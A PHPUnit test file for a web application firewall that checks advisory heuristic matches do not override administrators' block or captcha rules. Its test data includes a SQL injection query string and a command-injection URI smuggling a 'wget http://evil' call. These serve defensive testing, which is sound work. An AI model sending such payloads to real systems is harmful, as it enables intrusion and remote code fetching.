<?php
// SPDX-License-Identifier: BSD-3-Clause
// Copyright (c) 2026 WebTigers. Tiger™ and WebTigers™ are trademarks of WebTigers.

namespace TigerShield\Tests\Unit;

use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;
use ReflectionProperty;
use Tigershield_Service_Waf;
use Zend_Config;
use Zend_Controller_Request_Http;
use Zend_Registry;

/**
 * WAF enforcement precedence (TIGER-82).
 *
 * inspect() used to return on the FIRST shipped match. A soft category is capped at 'log', and
 * `waf.action` itself defaults to 'log', while custom admin rules were only evaluated when nothing
 * shipped had matched at all. So a request matching BOTH a shipped heuristic AND an administrator's
 * custom block rule was ALLOWED — the observe-only verdict shadowed the policy that said block.
 *
 * The rule these pin: an advisory match may inform, never mask. Strongest action wins.
 */
#[CoversClass(Tigershield_Service_Waf::class)]
final class WafPrecedenceTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        $this->setConfig([]);
        $this->setCustomRules([]);
        (new ReflectionProperty(Tigershield_Service_Waf::class, '_rules'))->setValue(null, null);
    }

    protected function tearDown(): void
    {
        $this->setCustomRules([]);
        Zend_Registry::_unsetInstance();
        parent::tearDown();
    }

    private function setConfig(array $shield): void
    {
        Zend_Registry::_unsetInstance();
        Zend_Registry::set('Zend_Config', new Zend_Config(['tiger' => ['tigershield' => $shield]], true));
    }

    /** Inject the compiled custom-rule set (normally read from the rule cache). */
    private function setCustomRules(array $rules): void
    {
        (new ReflectionProperty(Tigershield_Service_Waf::class, '_custom'))->setValue(null, $rules);
    }

    private function request(string $uri, string $ua = 'Mozilla/5.0'): Zend_Controller_Request_Http
    {
        $_SERVER['REQUEST_URI']     = $uri;
        $_SERVER['REQUEST_METHOD']  = 'GET';
        $_SERVER['HTTP_USER_AGENT'] = $ua;
        return new Zend_Controller_Request_Http('http://example.test' . $uri);
    }

    /** A query that trips the SOFT sqli heuristic — capped at 'log', i.e. advisory. */
    private const ADVISORY_URI = '/search?q=1%20union%20select%20password%20from%20users';

    // ---- the bug ----------------------------------------------------------------------------------

    #[Test]
    public function an_advisory_match_does_not_mask_a_custom_block(): void
    {
        $this->setCustomRules([
            ['label' => 'Block evil', 'target' => 'query', 'match' => 'contains', 'pattern' => 'password', 'action' => 'block'],
        ]);

        $hit = (new Tigershield_Service_Waf())->inspect($this->request(self::ADVISORY_URI));

        $this->assertNotNull($hit, 'the request matches something');
        $this->assertSame('block', $hit['action'],
            'the administrator said BLOCK; a soft advisory heuristic must not downgrade that to log');
    }

    #[Test]
    public function an_advisory_match_does_not_mask_a_custom_captcha(): void
    {
        $this->setCustomRules([
            ['label' => 'Challenge', 'target' => 'query', 'match' => 'contains', 'pattern' => 'password', 'action' => 'captcha'],
        ]);

        $hit = (new Tigershield_Service_Waf())->inspect($this->request(self::ADVISORY_URI));

        $this->assertSame('captcha', $hit['action']);
    }

    // ---- controls: the fix must not make everything a block ---------------------------------------

    #[Test]
    public function an_advisory_match_on_its_own_stays_advisory(): void
    {
        // The positive control. Without it, "always return block" would satisfy the tests above and
        // turn a heuristic into a site-breaking enforcement rule.
        $hit = (new Tigershield_Service_Waf())->inspect($this->request(self::ADVISORY_URI));

        $this->assertNotNull($hit, 'the soft heuristic still matches');
        $this->assertSame('log', $hit['action'], 'and is still observe-only when nothing stronger applies');
    }

    #[Test]
    public function a_clean_request_matches_nothing(): void
    {
        $this->setCustomRules([
            ['label' => 'Block evil', 'target' => 'query', 'match' => 'contains', 'pattern' => 'zzz-not-here', 'action' => 'block'],
        ]);

        $this->assertNull((new Tigershield_Service_Waf())->inspect($this->request('/about?page=2')));
    }

    #[Test]
    public function a_custom_rule_alone_still_applies(): void
    {
        // Custom rules used to be reachable only when nothing shipped matched — that path must still work.
        $this->setCustomRules([
            ['label' => 'No bots', 'target' => 'query', 'match' => 'contains', 'pattern' => 'crawl', 'action' => 'block'],
        ]);

        $hit = (new Tigershield_Service_Waf())->inspect($this->request('/index?crawl=1'));

        $this->assertSame('block', $hit['action']);
        $this->assertStringContainsString('custom', $hit['label']);
    }

    #[Test]
    public function a_weaker_custom_rule_never_downgrades_a_stronger_shipped_verdict(): void
    {
        // Precedence has to hold in BOTH directions, or the fix just moves the bug.
        $this->setConfig(['waf' => ['action' => 'block']]);
        $this->setCustomRules([
            ['label' => 'Just watch', 'target' => 'query', 'match' => 'contains', 'pattern' => 'union', 'action' => 'log'],
        ]);

        // `rce` is a HIGH-tier query category, so it takes waf.action = block.
        $hit = (new Tigershield_Service_Waf())->inspect($this->request('/x?cmd=%3Bwget%20http://evil'));

        $this->assertNotNull($hit);
        $this->assertSame('block', $hit['action'], 'a log-only custom rule cannot soften a shipped block');
    }

    #[Test]
    public function the_configured_action_still_governs_high_tier_categories(): void
    {
        $this->setConfig(['waf' => ['action' => 'captcha']]);
        $hit = (new Tigershield_Service_Waf())->inspect($this->request('/x?cmd=%3Bwget%20http://evil'));

        $this->assertNotNull($hit);
        $this->assertSame('captcha', $hit['action'], 'waf.action is still honoured for high-tier rules');
    }
}
